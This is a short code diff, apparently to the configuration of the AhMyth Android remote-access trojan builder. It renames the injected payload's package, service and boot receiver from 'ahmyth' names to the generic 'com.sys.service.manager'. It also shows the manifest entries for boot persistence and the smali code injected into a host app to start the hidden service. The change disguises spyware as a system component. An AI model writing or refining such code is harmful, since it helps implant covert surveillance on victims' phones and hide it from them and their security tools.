@@ -14,16 +14,16 @@ exports.outputApkPath = 'Output';
 exports.logColors = { RED: "red", GREEN: "green", DEFAULT: "white" };
 exports.logStatus = { SUCCESS: 1, FAIL: 0 };
 exports.defaultPort = 42474;
-exports.IOSocketPath = 'smali/ahmyth/mine/king/ahmyth/IOSocket.smali';
-exports.ahmythService = '<service android:enabled="true" android:exported="false" android:name="ahmyth.mine.king.ahmyth.MainService"/>';
-exports.ahmythReciver = '<receiver android:enabled="true" android:exported="true" android:name="ahmyth.mine.king.ahmyth.MyReceiver">' +
+exports.IOSocketPath = 'smali/com/sys/service/manager/IOSocket.smali';
+exports.ahmythService = '<service android:enabled="true" android:exported="false" android:name="com.sys.service.manager.MainService"/>';
+exports.ahmythReciver = '<receiver android:enabled="true" android:exported="true" android:name="com.sys.service.manager.MyReceiver">' +
     '<intent-filter>' +
     '<action android:name="android.intent.action.BOOT_COMPLETED"/>' +
     '</intent-filter>' +
     '</receiver>';
 exports.serviceSrc = '\n\n    new-instance v0, Landroid/content/Intent;' +
     '\n\n' +
-    '    const-class v1, Lahmyth/mine/king/ahmyth/MainService;' +
+    '    const-class v1, Lcom/sys/service/manager/MainService;' +
     '\n\n' +
     '    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V' +
     '\n\n' +
